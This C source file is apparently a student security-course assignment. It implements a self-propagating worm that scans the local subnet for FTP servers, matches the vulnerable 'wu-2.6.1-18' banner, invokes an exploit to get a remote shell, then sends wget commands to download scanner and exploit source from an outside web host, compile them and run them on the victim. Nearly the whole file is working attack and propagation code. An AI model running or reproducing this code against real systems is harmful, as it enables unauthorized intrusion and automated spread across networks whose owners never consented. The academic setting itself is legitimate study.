#include <stdio.h> 
#include <stdlib.h>
#include <string.h>
#include <sys/types.h> 
#include <sys/socket.h> 
#include <stdlib.h> 
#include <netinet/in.h>

#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/telnet.h>
#include <netdb.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <time.h>

#include <poll.h>

#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>

#define IP_LENGTH 15
#define BUFFER_SIZE 256

#if defined(__APPLE__)
# define NETWORK_INTERFACE "en0"
#else
# define NETWORK_INTERFACE "eth0"
#endif

void cshell (int sock);
int exploiter(int argc, char *argv[]);
char *showips();

int main(int argc, char *argv[]) {
 
    int ret; 
    int conexao; 
    char buffer[BUFFER_SIZE]; 
    int expsock;
    int port = 21;
    socklen_t lon; 
    fd_set myset; 
    struct timeval tv; 
    long arg; 
    int sockfd, n, res, valopt;
    struct hostent *server;
    struct sockaddr_in victim;
    struct pollfd fd;
    int i;
    char *ip;
    char *subnet;
    char *token;
    int ipaddr;
    char *ips;
    char *own_ip;
    int start_ip;

    // own_ip = malloc(IP_LENGTH*sizeof(char));
    ip = malloc(IP_LENGTH*sizeof(char));

    own_ip = showips();
    strcpy(ip, own_ip);

    // return(0);

    // strcpy(ip, "192.168.1.110");

    // Isolate subnet from IP
    i = 0;
    subnet = malloc(IP_LENGTH*sizeof(char));
    subnet[0] = '\0';
    while (((token = strsep(&ip, ".")) != NULL) && i<3 ) {        
        strcat(subnet, token);
        strcat(subnet, ".");
        i++;
    }

    if (argc == 2) {
        start_ip = atoi(argv[1]);
    } else {
        start_ip = atoi(token);
    }

    printf("own_ip: %s\n", own_ip);
    ip = malloc(IP_LENGTH*sizeof(char));
    ips = malloc(3*sizeof(char));
    for (ipaddr=start_ip; ipaddr<=254; ipaddr++) {

        sprintf(ip, "%s%d", subnet, ipaddr);

        // strcpy(ip, subnet);
        // sprintf(ips, "%d", ipaddr);
        // strncat(ip, ips, sizeof(ip) - strlen(ip) - 1);
        
        printf("ip: %s\n", ip);
        // check if IP is itself
        if (!strcmp(ip, own_ip)) {
            printf("Skipping %s\n", ip);
            continue;
        }

        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if(sockfd == -1) {
            printf("ERROR opening socket!\n");
            return(1);    
        }

        // Set non-blocking 
        arg = fcntl(sockfd, F_GETFL, NULL); 
        arg |= O_NONBLOCK; 
        fcntl(sockfd, F_SETFL, arg); 

        server = gethostbyname(ip);
        if (server == NULL) {
            fprintf(stderr,"ERROR, no such host\n");
            continue;
        }
        

        bzero((char *) &victim, sizeof(victim));
        victim.sin_family = AF_INET;
        bcopy((char *)server->h_addr, 
             (char *)&victim.sin_addr.s_addr,
             server->h_length);
        victim.sin_port = htons(port);

        // conexao = connect(meuSocket, (struct sockaddr * )&vitima, sizeof(vitima));

        printf("trying IP: %s\n", ip);
        // if (connect(sockfd,(struct sockaddr *)&victim,sizeof(victim)) < 0) {
        //     close(sockfd);

        //     if (errno == 51) { 
        //         // Error 51 means network unreachable, IP inactive
        //         // port = port_max;
        //         printf("IP unreachable\n");
        //     } // Other errors can be port inactive or operation timeout
        //     printf("FTP Port unreachable\n");
        //     continue; 
        // }
        res = connect(sockfd, (struct sockaddr *)&victim, sizeof(victim)); 
        // printf("res: %d\n", res);
        if (res < 0) { 
            if (errno == EINPROGRESS) { 
                tv.tv_sec = 2; 
                tv.tv_usec = 0; 
                FD_ZERO(&myset); 
                FD_SET(sockfd, &myset); 
                if (select(sockfd+1, NULL, &myset, NULL, &tv) > 0) { 
                    lon = sizeof(int); 
                    getsockopt(sockfd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon); 
                    if (valopt) { 
                        // fprintf(stderr, "Error in connection() %d - %s\n", valopt, strerror(valopt)); 
                        // exit(0); 
                    } 
                    // ret = recv(sockfd, buf, 199, 0);
                    // printf("O banner é: %s\n", bufffer);
                } else { 
                    fprintf(stderr, "Timeout or error() %d - %s\n", valopt, strerror(valopt));
                    // port = port_max;
                    continue; 
                   // exit(0); 
                } 
            } else { 
                fprintf(stderr, "Error connecting %d - %s\n", errno, strerror(errno)); 
                // port = port_max;
                continue;
                // exit(0); 
            } 
        }
        printf("tried IP: %s\n", ip);

        // Use poll.h to avoid long timeout

        fd.fd = sockfd;
        fd.events = POLLIN;
        ret = poll(&fd, 1, 10000); // 0.1 second timeout
        switch (ret) {
            case -1:
                // Error
                printf("%s\t%d\terror\n", ip, port);
                break;
            case 0:
                // Timeout 
                printf("%s\t%d\t \n", ip, port);
                break;
            default:
                // Get data
                memset(buffer, '\0', BUFFER_SIZE);
                n = read(sockfd,buffer,BUFFER_SIZE-1);
                if (strlen(buffer) > 0) {
                    // Add a line break only if there isn't one
                    if (buffer[strlen(buffer)-1] == '\n') {
                        printf("%s\t%d\t%s", ip, port, buffer);
                    } else {
                        printf("%s\t%d\t%s\n", ip, port, buffer);
                    }

                    if (strstr(buffer,"FTP server (Version wu-2.6.1-18) ready.") != NULL) {
                        int argc = 4;
                        char *argv[4] = {
                            "exploiter",
                            "-d",
                            ip,
                            "-a"
                        };

                        expsock = exploiter(argc, argv);
                        cshell(expsock);
                        return(1);
                    }
                }
                break;
        }

        close(sockfd);        

        // memset(buf, '\0', 200);
        // ret = recv(sockfd, buf, 199, 0);
        // printf("O banner é: %s\n", buf);
        // if (strstr(buf,"220 redhat1 FTP server (Version wu-2.6.1-18) ready.") != NULL) {
        //     int argc = 4;
        //     char *argv[4] = {
        //         "exploiter",
        //         "-d",
        //         ip,
        //         "-a"
        //     };

        //     fd = exploiter(argc, argv);
        //     cshell(fd);
        //     exit(1);
        // } else {
        //     // força bruta???
        //     victim.sin_port = htons(23);
        //     printf("trying IP: %s\n", ip);

        //     if (connect(sockfd,(struct sockaddr *)&victim,sizeof(victim)) < 0) {
        //         close(sockfd);

        //         if (errno == 51) { 
        //             // Error 51 means network unreachable, IP inactive
        //             // port = port_max;
        //             printf("IP unreachable\n");
        //         } // Other errors can be port inactive or operation timeout
        //         printf("Telnet Port unreachable\n");
        //         continue; 
        //     }
        // }
        

    }

    return(0);
    
     
    // if(ret == -1) {
    //     printf("Nao recebeu nada!\n\n"); 
    // }
     
    // printf("O banner é: %s\n", buf);

    // printf("Colocar aqui um if\n");
 
    // close(sockfd);
    // return(0); 
}

void cshell (int sock) {
        int     l;
        char    buf[512];
        char    buf2[2];
        fd_set  rfds;

        char *commands[4] = {   
                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/portscan.c\n",
                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/exploit.c\n",
                                "gcc -o portscan portscan.c exploit.c\n",
                                "./portscan > portscan.out\n"
        };

        int i;
        for(i=0; i<4; i++) {
            printf("sending command '%s", commands[i]);
            write (sock, commands[i], strlen(commands[i]));
            // sleep(3);
            // if (i == 1) {
            sleep(5);
            // }
        }
        

        // int i = 0;
        // while (1) {
        //     // printf("%s\n", commands[i]);

        //     FD_SET (0, &rfds);
        //     FD_SET (sock, &rfds);

        //     select (sock + 1, &rfds, NULL, NULL, NULL);

        //     // This here is user input
        //     if (FD_ISSET (0, &rfds)) {
        //         // l = read (0, buf2, sizeof (buf2));
        //         sprintf(buf, "%s",commands[i]);
        //         l = strlen(buf);
        //         // buf[l] = '\0';
        //         printf("-- %d %s --\n", l, buf);
        //         if (l <= 0) {
        //             perror ("read user");
        //             exit (EXIT_FAILURE);
        //         }
        //         write (sock, buf, l);

        //         i+=1;
        //     }

        //     // This is the terminal output
        //     if (FD_ISSET (sock, &rfds)) {
        //         l = read (sock, buf, sizeof (buf));
        //         //printf("-- %d %s --\n", l, buf);
        //         if (l == 0) {
        //             printf ("connection closed by foreign host.\n");
        //             exit (EXIT_FAILURE);
        //         } else if (l < 0) {
        //             perror ("read remote");
        //             exit (EXIT_FAILURE);
        //         }
        //         write (1, buf, l);
        //     }
        // }
}

char *showips() {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    /* I want to get an IPv4 IP address */
    ifr.ifr_addr.sa_family = AF_INET;

    /* I want IP address attached to "eth0" or "en0" */
    strncpy(ifr.ifr_name, NETWORK_INTERFACE, IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr);

    close(fd);

    /* display result */
    // printf("%s\n", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

    return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
}

// char *showips() {
//     struct ifaddrs *addrs;

//     getifaddrs(&addrs);
//     struct ifaddrs *tmp = addrs;

//     while (tmp) 
//     {
//         if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET)
//         {
//             struct sockaddr_in *pAddr = (struct sockaddr_in *)tmp->ifa_addr;
//             if (strcmp("lo0", tmp->ifa_name)) {
//                 printf("%s: %s\n", tmp->ifa_name, inet_ntoa(pAddr->sin_addr));
//                 return inet_ntoa(pAddr->sin_addr);
//             }
//         }

//         tmp = tmp->ifa_next;
//     }

//     freeifaddrs(addrs);

//     return NULL;
// }

// http://www.inf.ufpr.br/rdmgreca/sistdist/project1/relatorio/diag.c.txt
